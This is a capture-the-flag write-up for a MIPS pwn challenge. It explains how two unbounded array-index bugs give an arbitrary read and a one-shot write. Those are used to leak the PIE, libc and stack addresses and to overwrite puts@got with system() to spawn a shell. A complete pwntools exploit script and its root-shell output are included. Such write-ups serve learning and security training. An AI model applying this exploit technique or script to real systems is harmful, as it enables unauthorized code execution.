# Meeeps — MIPS pwn (50 pts)

**Category:** pwn
**Arch:** MIPS32 (little-endian, `mipsel`), o32 ABI
**Protections:** PIE, NX stack, stack canary, `RELRO` (partial / `BIND_NOW`)
**Given files:** `meeeps` (binary), `ld.so.1`, `libc.so.6`

> Hint: *"I like learning new arches"* — a nudge that this is a MIPS challenge rather than the usual x86/ARM.

## 1. Recon

```
$ file meeeps
meeeps: ELF 32-bit LSB pie executable, MIPS, MIPS32 rel2 version 1 (SYSV),
dynamically linked, interpreter /lib/ld.so.1, for GNU/Linux 6.16.0,
with debug_info, not stripped
```

Not stripped, with symbols — `main`, `setup`, `process`, `readnum` are all named. To disassemble a MIPS binary on an x86 host:

```bash
sudo apt install binutils-mips-linux-gnu qemu-user-static
mips-linux-gnu-objdump -d meeeps
```

To actually run/debug it locally (same trick the challenge's own `serve.sh` uses):

```bash
mkdir -p sysroot/lib
cp ld.so.1 libc.so.6 sysroot/lib/
qemu-mipsel-static -L sysroot ./meeeps
```

## 2. Program logic

`setup()` sets `stdout`/`stdin` to unbuffered and arms `alarm(60)` — **the whole exploit has to land inside 60 seconds of connecting**.

`process()`:

1. Reads a name into a 64-byte stack buffer (`s8+100`) via `read(0, buf, 63)` — no overflow here, but the buffer is **fully attacker-controlled** and gets echoed later via `puts()`. This becomes important.
2. Prints a menu:
   ```
   == gpslide ==
   1. read
   2. store
   3. go
   ```
3. **Choice 1 ("read"):** reads an index `i`, and prints `table[i]` where `table` is a **global** 64-entry `int` array (`.bss`, address `0x200c0`, size 256 bytes). **No bounds check on `i` at all** — `i` can be any 32-bit signed value, giving an **arbitrary-address read primitive** relative to `table`'s address. It's repeatable (loops back to the menu).
4. **Choice 2 ("store"):** reads index `i` and value `v`, bounds-checked to `0 <= i < 64`, writes `table[i] = v`. Safe.
5. **Choice 3 ("go"):** reads index `i` and value `v` with **no bounds check**, and writes the value to `*(s8 + i*4 + 36)` — i.e. an **arbitrary write relative to `process()`'s own stack frame**. Immediately after, it `puts()`s a static string (`"done"`), then `puts()`s the user's name buffer, then calls `exit(0)`. This case only runs once per connection (the program exits right after).

So we get:
- An **unlimited arbitrary read** (choice 1), and
- A **one-shot arbitrary write** (choice 3), followed by two `puts()` calls and an `exit(0)`.

## 3. The exploitation idea

The one-shot write happens *before* the two trailing `puts()` calls in the same code path. If we overwrite **`puts@got`** with the address of **`system()`**, then:

- `puts("done")` → becomes `system("done")` (harmless, shell just says `command not found` and returns).
- `puts(name_buffer)` → becomes `system(name_buffer)`.

Since the name buffer is fully attacker-controlled (set at the very start of the connection), setting the name to `/bin/sh\0` turns the second call into **`system("/bin/sh")`** — a shell, with stdin/stdout already wired to our socket.

This only needs **one** write (the overwrite of `puts@got`), which fits the "one shot" constraint of choice 3 perfectly.

## 4. Building the primitives

All of this uses the fact that `table`'s read (choice 1) is not just "read within the array" — because `i` is a signed 32-bit int and there's zero bounds checking, `table_address + i*4` can be made to equal **any** 32-bit address by choosing the right (possibly negative) `i`. So choice 1 is really "read 4 bytes at any address I want", as long as I know the *relative offset* from `table` to the target, or (later) the absolute addresses of both.

### 4.1 Leak the binary's own PIE base

MIPS o32 PIC calling convention keeps a GOT ("Global Offset Table") with:
- 14 **local** entries (addresses of functions/data within the binary itself — relocated by just adding the load bias at runtime), followed by
- one entry per **external** dynsym (resolved to real libc addresses, since the binary is built with `BIND_NOW`).

The local GOT slot at `0x20028` statically holds `&main` (`0xe74`). At runtime it holds `bin_base + 0xe74`. Reading it via choice 1:

```
idx = (0x20028 - 0x200c0) / 4   # relative to table, fixed at compile time
leaked = table[idx]             # == bin_base + 0xe74
bin_base = leaked - 0xe74
```

### 4.2 Leak the libc base

Same idea, but with an *external* GOT slot. `write@got` is at static offset `0x20070`:

```
idx = (0x20070 - 0x200c0) / 4
leaked = table[idx]             # == libc_base + offset_of_write_in_libc
libc_base = leaked - 0x112d60   # offset of write() in the given libc.so.6
```

(Verified against `read()`'s GOT slot too — both give the same `libc_base`, confirming the offsets.)

From `libc_base` we get `system_addr = libc_base + 0x4eb28` (offset taken straight from `readelf --dyn-syms libc.so.6`).

### 4.3 Leak a stack address

glibc's `environ` global variable holds a pointer to the process's `envp` array, i.e. a genuine stack address. Its address inside libc is `libc_base + 0x1e5eb8`. Now that `libc_base` is known as a real number, and `table`'s *runtime* address is known too (`bin_base + 0x200c0`), we can compute an absolute-address read directly:

```
idx = (environ_addr - table_runtime) / 4
stack_leak = table[idx]   # a real stack address
```

### 4.4 Pinning down `process()`'s own frame (`s8`)

We know `stack_leak` points somewhere near the top of the stack (where `envp` lives), but we need the *exact* address of `process()`'s stack frame to compute the index for the one-shot write.

Trick: the return address that `main()` pushes when calling `process()` is a **known constant** once `bin_base` is known (`bin_base + 0xec4`, read straight off the disassembly of the `bal process` call site). `process()`'s prologue saves this `$ra` at a fixed offset (`s8+172`) in its own frame.

Since choice 1 is repeatable (no one-shot limit) and we can now read *any* absolute address (same trick as above, just plug in a guessed stack address instead of a libc one), we scan words near `stack_leak` looking for one that equals the expected saved-`$ra` value:

```python
for i in range(RANGE):
    addr = stack_leak - i*4
    if read_abs(addr) == bin_base + 0xec4:
        s8 = addr - 172
        break
```

In practice this offset turned out to be **a fixed 78 words (312 bytes) below the `environ` leak**, consistently, across multiple fresh connections — because the docker/`qemu-user` launch command (`argv`/`envp`) never changes between runs. So the final script tries that exact offset first (one round trip) before falling back to a full scan.

### 4.5 The overwrite

```
puts_got_runtime = bin_base + 0x2007c
idx = (puts_got_runtime - s8 - 36) / 4
choice3(idx, system_addr)     # puts@got = system()
```

Right after this, the program's own code does:
```
puts("done");       // -> system("done")   (harmless)
puts(name_buffer);  // -> system("/bin/sh") -> SHELL
exit(0);
```

## 5. Gotcha: the alarm

`setup()` arms `alarm(60)` the moment the connection is accepted. All the leaking + scanning round-trips eat into that budget, so the script must **grab the flag immediately** (`cat flag.txt`) the instant the shell spawns, rather than waiting for a human to type into `p.interactive()` — the alarm can (and did) fire mid-typing and kill the session.

## 6. Final script (pwntools)

```python
from pwn import *
import ctypes, time

context.arch = 'mips'
context.endian = 'little'
context.bits = 32

HOST, PORT = '52.146.88.61', 38603  # update per instance

LIBC_WRITE_OFF, LIBC_SYSTEM_OFF, LIBC_ENVIRON_OFF = 0x112d60, 0x4eb28, 0x1e5eb8
MAIN_STATIC, RA_AFTER_CALL   = 0xe74, 0xec4
TABLE_STATIC                 = 0x200c0
PUTS_GOT_STATIC              = 0x2007c
MAIN_GOT_SLOT_STATIC         = 0x20028
WRITE_GOT_STATIC             = 0x20070

s32 = lambda x: ctypes.c_int32(x & 0xffffffff).value
u32 = lambda x: x & 0xffffffff

p = remote(HOST, PORT)
p.sendlineafter(b'name: ', b'/bin/sh\x00')

def leak(idx):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'i: ', str(s32(idx)).encode())
    line = p.recvline().strip()
    return 0 if line == b'(nil)' else int(line, 16)

def write(idx, val):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'i: ', str(s32(idx)).encode())
    p.sendlineafter(b'v: ', str(s32(val)).encode())

bin_base = leak((MAIN_GOT_SLOT_STATIC - TABLE_STATIC)//4) - MAIN_STATIC
table_rt, puts_got_rt = bin_base + TABLE_STATIC, bin_base + PUTS_GOT_STATIC
expected_ra = u32(bin_base + RA_AFTER_CALL)

libc_base = leak((WRITE_GOT_STATIC - TABLE_STATIC)//4) - LIBC_WRITE_OFF
system_addr = libc_base + LIBC_SYSTEM_OFF

environ_addr = libc_base + LIBC_ENVIRON_OFF
stack_leak = leak((environ_addr - table_rt)//4)

FOUND = None
for i in [78]:                       # fast path: known fixed offset
    addr = u32(stack_leak - i*4)
    if leak((addr - table_rt)//4) == expected_ra:
        FOUND = addr

if FOUND is None:                    # fallback: wider scan
    for d in (-1, 1):
        for i in range(8192):
            addr = u32(stack_leak + d*i*4)
            if (addr - table_rt) % 4: continue
            if leak((addr - table_rt)//4) == expected_ra:
                FOUND = addr; break
        if FOUND: break

s8 = FOUND - 172
write((puts_got_rt - s8 - 36)//4, system_addr)

p.sendline(b'cat flag.txt')
time.sleep(1)
print(p.recvrepeat(2).decode(errors='replace'))
p.interactive()
```

## 7. Result

```
$ python3 solve.py
[+] binary base = 0x490000
[+] libc base   = 0xd10000
[+] system()    = 0xd5eb28
[+] stack leak  = 0xcbad0c
[+] saved RA found at 0xcbabd4
uid=0(root) gid=0(root) groups=0(root)
flag{...}
```

## 8. Takeaways

- Two unbounded-index array accesses in the same menu function: one **read** (infoleak), one **write** (control-flow hijack) — a very standard "edit-array-by-index" pwn pattern, just ported to MIPS.
- On MIPS o32 PIC binaries, the GOT's **local** entries (function/data addresses *within* the same object) leak the binary's own PIE base just as reliably as external entries leak libc — useful when you need both.
- A "one-shot" write isn't fatal if there's a reachable GOT call sitting right after it in the same code path — here, redirecting `puts` whose very next argument (`name`) was already under our control turned a single write into full `system()` execution.
- Not knowing the stack layout exactly is fine if you have a *repeatable* read primitive and a predictable constant (the saved return address) to scan for — this avoids relying on guesswork about argv/envp sizes.
